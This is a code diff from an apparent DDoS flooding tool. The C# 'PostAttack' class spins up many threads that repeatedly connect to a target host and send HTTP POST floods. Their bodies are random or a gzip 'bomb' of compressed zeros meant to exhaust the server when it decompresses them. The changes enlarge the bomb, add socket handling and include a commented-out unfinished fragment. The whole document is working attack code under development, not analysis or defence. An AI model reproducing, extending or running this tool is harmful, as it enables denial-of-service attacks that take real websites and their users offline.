@@ -18,13 +18,15 @@ namespace GAS.Core
         private Random rnd = new Random();
         private bool random, usegZip, IPOrDns = true, Resp;
         private Thread[] WorkingThreads;
+        private TcpClient[] WorkingSockets;
         private volatile string AttackHeader = "";
-        byte[] GZIPBomb = Properties.Resources._128mz;//contains gzipped dump of /dev/zero. gzipped size=150kb, real = 128MB
+        byte[] GZIPBomb = Properties.Resources._256mz;//contains gzipped dump of /dev/zero. gzipped size=150kb, real = 128MB
         #endregion
         public PostAttack(string dns, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool usegzip, int threadcount)
         {
             ThreadCount = threadcount;
             WorkingThreads = new Thread[ThreadCount];
+            WorkingSockets = new TcpClient[ThreadCount];
             this.IsDelayed = false;
             try { this.DNS = dns; }
             catch { this.DNS = this.IP.ToString(); }
@@ -37,7 +39,7 @@ namespace GAS.Core
             this.Port = port;
             this.Subsite = subSite;
             this.Resp = resp;
-            this.Delay = delay;
+            this.Delay = Convert.ToInt32(Math.Pow(2, Math.Sqrt(Convert.ToDouble(delay))));
             this.Timeout = timeout * 1000;
             this.random = random;
             this.usegZip = usegzip;
@@ -60,34 +62,44 @@ namespace GAS.Core
         private void bw_DoWork(object indexinthreads)
         {
             #region Wait 4 init
-            while (!init)
-                Thread.Sleep(100);
+            while (!init) Thread.Sleep(100);
             int MY_INDEX_FOR_WORK = (int)indexinthreads;
             #endregion
             try
             {
                 #region Prepare
+                WorkingSockets[MY_INDEX_FOR_WORK] = new TcpClient(AddressFamily.InterNetwork);
                 int bfsize = 1024; // this should be less than the MTU
                 byte[] recvBuf = new byte[bfsize];
-                int recvd = 0;
                 byte[] buf;
+                int recvd = 0;
                 int snd = new Random().Next(1024 * 1024 * 64);
                 #region Headers
-                buf = System.Text.Encoding.ASCII.GetBytes(
-                 String.Format("POST {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{2}Content-Type: {3}\r\nContent-Length: {4}\r\n\r\n",
-                                       Subsite,
-                                       DNS,
-                                       ((usegZip) ? ("Content-Encoding: gzip" + Environment.NewLine) : ""),
-                                       "application/x-www-form-urlencoded",
-                                       random ? snd : GZIPBomb.Length));
+                buf = System.Text.Encoding.ASCII.GetBytes(String.Format("POST {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n{2}Content-Type: {3}\r\nContent-Length: {4}\r\n\r\n",Subsite, DNS, ((usegZip) ? ("Content-Encoding: gzip" + Environment.NewLine) : ""), "application/x-www-form-urlencoded", random ? snd : GZIPBomb.Length));
                 #endregion
                 #endregion
                 #region DDos
                 while (IsFlooding)
                 {
                     States[MY_INDEX_FOR_WORK] = ReqState.Ready;
-                    recvBuf = new byte[bfsize];
+                    /*
+                    try
+                    {
+                        WorkingSockets[MY_INDEX_FOR_WORK].Connect(IP, Port);
+                    }
+                    catch { continue; }
+                    if (!WorkingSockets[MY_INDEX_FOR_WORK].Connected)
+                        continue;
+                    else
+                    {
+                        var s = WorkingSockets[MY_INDEX_FOR_WORK].GetStream();
+                        s.
+                    }*/
+                    #region Old code
+                    
                     #region Connect
+                    //TcpClient socket = new TcpClient(AddressFamily.InterNetwork);
+                    
                     Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     States[MY_INDEX_FOR_WORK] = ReqState.Connecting;
                     try { socket.Connect(IP, Port); }
@@ -131,7 +143,7 @@ namespace GAS.Core
                                 if ((r = mb.Read(buf, 0, buf.Length)) < buf.Length)
                                     Array.Resize<byte>(ref buf, r);
                             }
-                            while (socket.Connected&& (i += socket.Send(buf)) < GZIPBomb.Length);
+                            while (socket.Connected && (i += socket.Send(buf)) < GZIPBomb.Length);
                             }
                             catch { }
                         }
@@ -155,7 +167,9 @@ namespace GAS.Core
                     #endregion
                     States[MY_INDEX_FOR_WORK] = ReqState.Completed;
                     Downloaded++;
-                    if (Delay > 0) System.Threading.Thread.Sleep(Delay + 1);
+                    if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+                    
+                    #endregion
                 }
                 #endregion
             }
@@ -169,13 +183,8 @@ namespace GAS.Core
             try
             {
                 foreach (var x in WorkingThreads)
-                {
-                    try
-                    {
-                        x.Abort();
-                    }
+                    try { x.Abort(); }
                     catch { }
-                }
             }
             catch { }
         }
